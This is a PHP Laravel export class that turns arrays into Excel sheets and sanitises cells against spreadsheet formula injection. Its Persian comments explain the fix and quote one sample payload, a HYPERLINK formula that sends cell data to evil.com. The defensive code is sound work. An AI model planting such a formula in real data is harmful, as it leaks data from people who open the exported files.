<?php

namespace App\Exports;

use Maatwebsite\Excel\Concerns\FromArray;
use Maatwebsite\Excel\Concerns\ShouldAutoSize;
use Maatwebsite\Excel\Concerns\WithHeadings;

/**
 * خروجی اکسل عمومی برای آرایه‌ای از ردیف‌های انجمنی (associative).
 *
 * ✅ قبلاً در ReportExportController به‌جای یک کلاس export واقعی، از
 * «new \Maatwebsite\Excel\Sheet($data)» استفاده می‌شد که سازنده‌اش
 * PhpOffice\PhpSpreadsheet\Worksheet\Worksheet می‌خواهد نه آرایه — یعنی
 * حتی با نصب بودن پکیج maatwebsite/excel، هر export بلافاصله با
 * TypeError کرش می‌کرد؛ ضمن اینکه پکیج‌های maatwebsite/excel و
 * barryvdh/laravel-dompdf اصلاً در composer.json نصب نشده بودند.
 */
class ArrayExport implements FromArray, ShouldAutoSize, WithHeadings
{
    protected array $headings;

    public function __construct(protected array $data)
    {
        $this->headings = ! empty($data) ? array_keys($data[0]) : [];
    }

    public function array(): array
    {
        return array_map(
            fn ($row) => array_map([self::class, 'sanitizeCell'], array_values($row)),
            $this->data
        );
    }

    /**
     * ✅ محافظ CSV/Excel Formula Injection (CWE-1236): این export عمومی
     * برای همه‌ی export های ادمین (محصولات، سفارشات، کاربران، چت، گزارش‌ها)
     * استفاده می‌شود و مقادیرش مستقیم از داده‌ی کاربر می‌آیند — مثلاً نام
     * محصول از همین فیچر آپلود گروهی. اگر یک فروشنده نام محصول را چیزی مثل
     * '=HYPERLINK("http://evil.com?"&A1)' بگذارد و بعداً ادمین محصولات را
     * Export بگیرد و فایل را در Excel/LibreOffice باز کند، این رشته به‌عنوان
     * فرمول اجرا می‌شود، نه متن. با یک ' در ابتدای مقادیری که با
     * =, +, -, @ یا تب/CR شروع می‌شوند (کاراکترهایی که این نرم‌افزارها
     * فرمول تشخیص می‌دهند)، همان مقدار فقط به‌عنوان متن نمایش داده می‌شود.
     */
    private static function sanitizeCell($value)
    {
        if (! is_string($value) || $value === '') {
            return $value;
        }

        if (preg_match('/^[=+\-@\t\r]/', $value)) {
            return "'".$value;
        }

        return $value;
    }

    public function headings(): array
    {
        return $this->headings;
    }
}
